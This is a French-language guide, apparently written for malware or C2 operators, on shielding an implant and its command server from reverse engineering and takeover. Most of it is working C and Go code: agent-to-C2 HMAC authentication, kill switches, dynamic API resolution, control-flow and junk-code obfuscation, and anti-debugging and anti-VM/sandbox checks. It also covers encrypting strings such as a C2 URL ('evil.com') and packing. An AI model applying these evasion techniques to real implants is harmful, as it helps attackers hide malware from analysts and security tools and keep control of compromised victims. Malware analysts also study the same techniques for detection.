# Guide Anti-Reverse Engineering & Contrôle d'Accès

## Table des matières
1. [Contrôle d'accès au C2](#contrôle-daccès-au-c2)
2. [Protection de l'agent](#protection-de-lagent)
3. [Obfuscation du code](#obfuscation-du-code)
4. [Anti-debugging](#anti-debugging)
5. [Anti-VM/Sandbox](#anti-vmsandbox)
6. [Protection des strings](#protection-des-strings)
7. [Packing & Crypting](#packing--crypting)

---

## Contrôle d'accès au C2

### Problème

```
┌─────────────────────────────────────────────────────────────┐
│                    RISQUES                                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Quelqu'un reverse l'agent → trouve l'URL du C2          │
│  2. Il se connecte à ton C2 avec son propre agent           │
│  3. Il prend le contrôle de TES victimes                    │
│  4. Ou il analyse ton infrastructure                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Solutions

#### 1. Authentification mutuelle (Agent ↔ Serveur)

```
┌─────────────────────────────────────────────────────────────┐
│           AUTHENTIFICATION AGENT                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  AGENT                              SERVEUR C2               │
│  ─────                              ──────────               │
│  1. Agent ID unique (compilé)                               │
│  2. Clé pré-partagée (PSK)                                  │
│  3. Timestamp + HMAC                                        │
│                                                              │
│     POST /beacon                                            │
│     Headers:                                                │
│       X-Agent-ID: abc123                                    │
│       X-Timestamp: 1705936212                               │
│       X-Signature: HMAC(agent_id + timestamp, PSK)          │
│                                                              │
│     Le serveur vérifie:                                     │
│     - Agent ID connu ?                                      │
│     - Timestamp pas trop vieux ? (replay attack)            │
│     - Signature valide ?                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Code serveur (Go) :**
```go
func validateAgent(r *http.Request) bool {
    agentID := r.Header.Get("X-Agent-ID")
    timestamp := r.Header.Get("X-Timestamp")
    signature := r.Header.Get("X-Signature")
    
    // Vérifie que l'agent existe
    psk, exists := registeredAgents[agentID]
    if !exists {
        return false
    }
    
    // Vérifie le timestamp (pas plus de 5 min)
    ts, _ := strconv.ParseInt(timestamp, 10, 64)
    if time.Now().Unix() - ts > 300 {
        return false
    }
    
    // Vérifie la signature
    expected := hmacSHA256(agentID + timestamp, psk)
    return hmac.Equal([]byte(signature), []byte(expected))
}
```

**Code agent (C) :**
```c
void add_auth_headers(HINTERNET hRequest) {
    char timestamp[32];
    sprintf(timestamp, "%lld", time(NULL));
    
    // Signature = HMAC(agent_id + timestamp, PSK)
    char data[256];
    sprintf(data, "%s%s", AGENT_ID, timestamp);
    char* signature = hmac_sha256(data, PSK);
    
    HttpAddRequestHeaders(hRequest, "X-Agent-ID: " AGENT_ID);
    HttpAddRequestHeaders(hRequest, timestamp_header);
    HttpAddRequestHeaders(hRequest, signature_header);
}
```

#### 2. Certificat client (mTLS)

```
┌─────────────────────────────────────────────────────────────┐
│                    mTLS                                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Chaque agent a un certificat client unique                 │
│  Le serveur vérifie le certificat avant d'accepter          │
│                                                              │
│  Avantages:                                                 │
│  - Impossible de se connecter sans le certificat            │
│  - Le certificat peut être révoqué                          │
│                                                              │
│  Inconvénients:                                             │
│  - Plus complexe à implémenter                              │
│  - Certificat extractible si l'agent est analysé            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 3. Unique Build ID

Chaque compilation = ID unique :

```c
// Généré à la compilation
#define BUILD_ID "a7f3b2c9-8d4e-4f1a-b5c6-d7e8f9012345"
#define BUILD_KEY "random_32_bytes_per_build..."

// Le serveur maintient une liste des BUILD_ID valides
// Un BUILD_ID peut être révoqué si compromis
```

### 4. Kill Switch

```
┌─────────────────────────────────────────────────────────────┐
│                   KILL SWITCH                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Si l'agent est compromis:                                  │
│                                                              │
│  Option 1: Révoque l'agent ID côté serveur                  │
│  → L'agent ne peut plus communiquer                         │
│                                                              │
│  Option 2: Envoie une commande "self-destruct"              │
│  → L'agent se supprime                                      │
│                                                              │
│  Option 3: Change la clé de chiffrement                     │
│  → L'ancien agent ne peut plus déchiffrer                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Protection de l'agent

### Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────┐
│              COUCHES DE PROTECTION                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────────────────────────────────┐                │
│  │  Couche 5: Packer/Crypter               │                │
│  │  (UPX, custom packer, VM protector)     │                │
│  ├─────────────────────────────────────────┤                │
│  │  Couche 4: Anti-Debug/Anti-VM           │                │
│  │  (détection sandbox, timing checks)     │                │
│  ├─────────────────────────────────────────┤                │
│  │  Couche 3: Obfuscation                  │                │
│  │  (control flow, dead code, junk)        │                │
│  ├─────────────────────────────────────────┤                │
│  │  Couche 2: Protection strings           │                │
│  │  (chiffrement, stack strings)           │                │
│  ├─────────────────────────────────────────┤                │
│  │  Couche 1: Code source                  │                │
│  │  (indirect calls, no symbols)           │                │
│  └─────────────────────────────────────────┘                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Obfuscation du code

### 1. Supprimer les symboles

```bash
# Compilation sans symboles
gcc -s -O2 agent.c -o agent.exe        # -s = strip symbols
strip --strip-all agent.exe            # ou après

# Go
go build -ldflags="-s -w" -o agent.exe  # -s -w = no symbols, no debug
```

### 2. Indirect API Calls

Au lieu d'appeler directement les APIs (visible dans l'IAT) :

```c
// ❌ MAUVAIS - Visible dans l'IAT
#include <windows.h>
VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// ✅ BON - Résolution dynamique
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandle("kernel32.dll"), 
    "VirtualAlloc"
);
MyVirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

### 3. Obfuscation des noms de fonctions

```c
// Noms de fonctions chiffrés
char enc_virtualalloc[] = {0x17, 0x3a, 0x29, ...}; // "VirtualAlloc" XOR key

void* resolve_api(char* encrypted_name, char* key) {
    char decrypted[64];
    xor_decrypt(encrypted_name, key, decrypted);
    return GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
}
```

### 4. Control Flow Obfuscation

```c
// ❌ FACILE À COMPRENDRE
void malicious_function() {
    step1();
    step2();
    step3();
}

// ✅ DIFFICILE À SUIVRE
void malicious_function() {
    int state = 0;
    while (1) {
        switch (state ^ 0xDEAD) {
            case 0xDEAD: step1(); state = 1; break;
            case 0xDEAC: step2(); state = 2; break;
            case 0xDEAF: step3(); return;
            default: state = (state * 7 + 3) % 5; break;
        }
    }
}
```

### 5. Dead Code / Junk Code

```c
void real_function() {
    // Junk qui ne fait rien mais complique l'analyse
    volatile int x = rand();
    if (x == -999999) {
        fake_api_call_1();
        fake_api_call_2();
    }
    
    // Vrai code
    do_something_real();
    
    // Plus de junk
    for (volatile int i = 0; i < 0; i++) {
        another_fake_call();
    }
}
```

### 6. Opaque Predicates

Conditions qui semblent dynamiques mais sont toujours vraies/fausses :

```c
// Toujours vrai (x² ≥ 0)
int x = get_some_value();
if (x * x >= 0) {
    real_code();
} else {
    fake_scary_code();  // Jamais exécuté mais analysé
}

// Toujours faux (x² + 1 > x² toujours)
if ((x * x + 1) < (x * x)) {
    more_fake_code();
}
```

---

## Anti-debugging

### 1. IsDebuggerPresent

```c
if (IsDebuggerPresent()) {
    exit(0);  // Ou comportement innocent
}
```

### 2. PEB Check (plus fiable)

```c
#include <winternl.h>

BOOL check_peb_debugger() {
    PPEB peb = (PPEB)__readgsqword(0x60);  // x64
    // PPEB peb = (PPEB)__readfsdword(0x30);  // x86
    
    return peb->BeingDebugged;
}
```

### 3. NtQueryInformationProcess

```c
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

BOOL check_debug_port() {
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");
    
    DWORD_PTR debugPort = 0;
    NtQIP(GetCurrentProcess(), ProcessDebugPort, &debugPort, sizeof(debugPort), NULL);
    
    return debugPort != 0;
}
```

### 4. Timing Check

```c
BOOL timing_check() {
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Opération simple
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x++;
    
    QueryPerformanceCounter(&end);
    
    // Si > 100ms, probablement debuggé
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    return elapsed > 0.1;
}
```

### 5. Hardware Breakpoints

```c
BOOL check_hardware_breakpoints() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}
```

### 6. Int 2D Check

```c
BOOL check_int2d() {
    __try {
        __asm {
            int 2dh
            nop
        }
        return FALSE;  // Pas de debugger
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return TRUE;   // Debugger détecté
    }
}
```

---

## Anti-VM/Sandbox

### 1. Check CPU Count

```c
BOOL check_cpu() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;  // VM souvent 1-2 CPU
}
```

### 2. Check RAM

```c
BOOL check_ram() {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024);  // < 2GB
}
```

### 3. Check Uptime

```c
BOOL check_uptime() {
    return GetTickCount64() < (10 * 60 * 1000);  // < 10 minutes = sandbox
}
```

### 4. Check VM Artifacts

```c
BOOL check_vm_registry() {
    HKEY hKey;
    // VMware
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\VMware, Inc.\\VMware Tools", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    // VirtualBox
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL check_vm_files() {
    return PathFileExists("C:\\Windows\\System32\\drivers\\vmmouse.sys") ||
           PathFileExists("C:\\Windows\\System32\\drivers\\vmhgfs.sys") ||
           PathFileExists("C:\\Windows\\System32\\drivers\\VBoxMouse.sys");
}

BOOL check_vm_processes() {
    // Chercher vmtoolsd.exe, VBoxService.exe, etc.
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    
    if (Process32First(hSnap, &pe)) {
        do {
            if (strstr(pe.szExeFile, "vmtoolsd") ||
                strstr(pe.szExeFile, "VBox")) {
                CloseHandle(hSnap);
                return TRUE;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return FALSE;
}
```

### 5. Check MAC Address

```c
BOOL check_vm_mac() {
    // VMware: 00:0C:29, 00:50:56
    // VirtualBox: 08:00:27
    // Hyper-V: 00:15:5D
    
    IP_ADAPTER_INFO adapters[16];
    ULONG size = sizeof(adapters);
    GetAdaptersInfo(adapters, &size);
    
    for (PIP_ADAPTER_INFO p = adapters; p; p = p->Next) {
        if ((p->Address[0] == 0x00 && p->Address[1] == 0x0C && p->Address[2] == 0x29) ||
            (p->Address[0] == 0x08 && p->Address[1] == 0x00 && p->Address[2] == 0x27)) {
            return TRUE;
        }
    }
    return FALSE;
}
```

### 6. User Interaction

```c
BOOL check_user_interaction() {
    // Attendre un mouvement de souris
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(3000);
    GetCursorPos(&p2);
    
    // Si la souris n'a pas bougé = sandbox
    return (p1.x == p2.x && p1.y == p2.y);
}
```

---

## Protection des strings

### 1. XOR Runtime

```c
// Au lieu de:
char* url = "http://evil.com";

// Faire:
unsigned char enc_url[] = {0x3a, 0x2b, ...};  // XOR avec key
char url[64];
xor_decrypt(enc_url, sizeof(enc_url), key, url);
```

### 2. Stack Strings

```c
// Au lieu de:
char* cmd = "cmd.exe";

// Construire sur la stack:
char cmd[8];
cmd[0] = 'c';
cmd[1] = 'm';
cmd[2] = 'd';
cmd[3] = '.';
cmd[4] = 'e';
cmd[5] = 'x';
cmd[6] = 'e';
cmd[7] = '\0';
```

### 3. Computed Strings

```c
char* get_cmd() {
    static char buf[8];
    buf[0] = 'c' ^ 0x41 ^ 0x41;  // = 'c'
    buf[1] = 'm' ^ 0x42 ^ 0x42;
    buf[2] = 'd' ^ 0x43 ^ 0x43;
    buf[3] = '.' ^ 0x44 ^ 0x44;
    buf[4] = 'e' ^ 0x45 ^ 0x45;
    buf[5] = 'x' ^ 0x46 ^ 0x46;
    buf[6] = 'e' ^ 0x47 ^ 0x47;
    buf[7] = 0;
    return buf;
}
```

---

## Packing & Crypting

### UPX (basique, facilement détecté)

```bash
upx --best agent.exe
```

### Custom Packer

```
┌─────────────────────────────────────────────────────────────┐
│                   CUSTOM PACKER                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Original.exe                                               │
│       │                                                      │
│       ▼                                                      │
│  ┌─────────────────────────────────────────┐                │
│  │  1. Compresse (LZMA, zlib)              │                │
│  │  2. Chiffre (AES, RC4)                  │                │
│  │  3. Ajoute un stub loader               │                │
│  └─────────────────────────────────────────┘                │
│       │                                                      │
│       ▼                                                      │
│  Packed.exe                                                 │
│                                                              │
│  À l'exécution:                                             │
│  Stub ──► Déchiffre ──► Décompresse ──► Exécute en mémoire  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Techniques avancées

| Technique | Description |
|-----------|-------------|
| **Polymorphisme** | Chaque build = code différent |
| **Métamorphisme** | Se réécrit à chaque exécution |
| **VM Protector** | Convertit le code en bytecode custom |
| **Code Virtualization** | Themida, VMProtect |

---

## Résumé

### Checklist Anti-RE

```
[ ] Symboles supprimés
[ ] Strings chiffrées
[ ] APIs résolues dynamiquement
[ ] Anti-debug (PEB, timing, breakpoints)
[ ] Anti-VM (CPU, RAM, artifacts)
[ ] Authentification agent-serveur
[ ] Kill switch implémenté
[ ] Code obfusqué (control flow, junk)
[ ] Packer/Crypter appliqué
```

### Priorités

| Priorité | Protection | Effort |
|----------|------------|--------|
| 🔴 Haute | Auth agent + strings chiffrées | Moyen |
| 🟠 Moyenne | Anti-debug + strip symbols | Faible |
| 🟡 Basse | Obfuscation avancée + packer | Élevé |
